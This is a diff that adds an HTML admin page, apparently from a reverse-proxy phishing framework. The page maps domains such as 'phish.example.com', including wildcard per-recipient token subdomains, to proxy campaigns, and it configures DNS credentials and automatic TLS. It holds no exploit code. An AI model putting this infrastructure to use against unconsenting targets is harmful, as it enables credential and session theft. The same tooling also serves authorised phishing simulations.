@@ -1,0 +1,120 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-5xl mx-auto py-8">
+
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="/" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO DASHBOARD ]
+    </a>
+  </div>
+  <h1 class="text-3xl font-extrabold font-mono-brutal mb-6">PROXY DOMAINS</h1>
+
+  <div class="brutal-card p-6 mb-8">
+    <h2 class="text-xl font-bold font-mono-brutal mb-4">Map Domain to Proxy Campaign</h2>
+    <p class="text-sm font-mono-brutal text-gray-600 dark:text-gray-400 mb-4">
+      Exact domains map one hostname to one campaign. Wildcard domains
+      (<code>*.example.com</code>) give every recipient a unique clean URL like
+      <code>token123.example.com</code>.
+    </p>
+    <form method="post" action="{{ url_for('admin_proxy_domain_new') }}" class="space-y-4">
+      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">Domain</label>
+        <input type="text" name="domain" required placeholder="phish.example.com or *.phish.example.com" class="w-full p-2 border-2 border-pure-black focus:outline-none">
+      </div>
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">Campaign</label>
+        <select name="campaign_id" required class="w-full p-2 border-2 border-pure-black focus:outline-none">
+          <option value="">Select a reverse proxy campaign</option>
+          {% for c in campaigns %}
+          <option value="{{ c.id }}">{{ c.name }}</option>
+          {% endfor %}
+        </select>
+      </div>
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">Server IP (for wildcard DNS A record)</label>
+        <input type="text" name="server_ip" placeholder="203.0.113.10" class="w-full p-2 border-2 border-pure-black focus:outline-none">
+      </div>
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">DNS Provider</label>
+        <select name="dns_provider" class="w-full p-2 border-2 border-pure-black focus:outline-none">
+          <option value="none">None / Manual</option>
+          <option value="manual">Manual (log instructions)</option>
+          <option value="cloudflare">Cloudflare</option>
+          <option value="route53">AWS Route53</option>
+          <option value="digitalocean">DigitalOcean</option>
+        </select>
+      </div>
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">DNS Credentials JSON</label>
+        <textarea name="dns_credentials" rows="3" placeholder='{"api_token":"...","zone_id":"..."}' class="w-full p-2 border-2 border-pure-black focus:outline-none font-mono text-sm"></textarea>
+      </div>
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">TLS Provider</label>
+        <select name="tls_provider" class="w-full p-2 border-2 border-pure-black focus:outline-none">
+          <option value="none">None</option>
+          <option value="caddy">Caddy on-demand TLS</option>
+          <option value="certbot">Certbot wildcard (DNS-01)</option>
+        </select>
+      </div>
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">ACME Email</label>
+        <input type="email" name="acme_email" placeholder="admin@example.com" class="w-full p-2 border-2 border-pure-black focus:outline-none">
+      </div>
+      <label class="flex items-center gap-2">
+        <input type="checkbox" name="auto_tls_enabled" class="w-4 h-4">
+        <span class="font-mono-brutal text-sm font-bold">Auto-provision TLS on campaign launch</span>
+      </label>
+      <button type="submit" class="brutal-btn-black px-6 py-2">MAP DOMAIN</button>
+    </form>
+  </div>
+
+  <div class="brutal-card p-6">
+    <h2 class="text-xl font-bold font-mono-brutal mb-4">Existing Mappings</h2>
+    <div class="overflow-x-auto">
+      <table class="w-full text-sm font-mono-brutal min-w-[900px]">
+        <thead class="border-b-2 border-pure-black dark:border-stark-white">
+          <tr>
+            <th class="text-left py-2">Domain</th>
+            <th class="text-left py-2">Campaign</th>
+            <th class="text-left py-2">DNS</th>
+            <th class="text-left py-2">TLS</th>
+            <th class="text-left py-2">Status</th>
+            <th class="text-right py-2">Actions</th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for d in domains %}
+          <tr class="border-b border-gray-300 dark:border-gray-700">
+            <td class="py-2">{{ d.domain }}</td>
+            <td class="py-2">{{ d.campaign.name }}</td>
+            <td class="py-2">{{ d.dns_provider }}<br><span class="text-xs text-gray-500">{{ d.server_ip or '-' }}</span></td>
+            <td class="py-2">{{ d.tls_provider }}<br><span class="text-xs {% if d.tls_ready %}text-brutal-emerald{% else %}text-brutal-amber{% endif %}">{{ 'ready' if d.tls_ready else 'not ready' }}</span></td>
+            <td class="py-2">{{ 'Active' if d.is_active else 'Disabled' }}</td>
+            <td class="py-2 text-right space-x-2">
+              <form method="post" action="{{ url_for('admin_proxy_domain_provision', domain_id=d.id) }}" class="inline">
+                <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+                <button type="submit" class="brutal-btn-white px-3 py-1 text-xs">PROVISION</button>
+              </form>
+              <form method="post" action="{{ url_for('admin_proxy_domain_toggle', domain_id=d.id) }}" class="inline">
+                <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+                <button type="submit" class="brutal-btn-white px-3 py-1 text-xs">{{ 'DISABLE' if d.is_active else 'ENABLE' }}</button>
+              </form>
+              <form method="post" action="{{ url_for('admin_proxy_domain_delete', domain_id=d.id) }}" class="inline" onsubmit="return confirm('Delete this domain mapping?');">
+                <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+                <button type="submit" class="brutal-btn-red px-3 py-1 text-xs">DELETE</button>
+              </form>
+            </td>
+          </tr>
+          {% else %}
+          <tr><td colspan="6" class="py-4 text-gray-500 dark:text-gray-400">No proxy domains mapped yet.</td></tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+</div>
+{% endblock %}
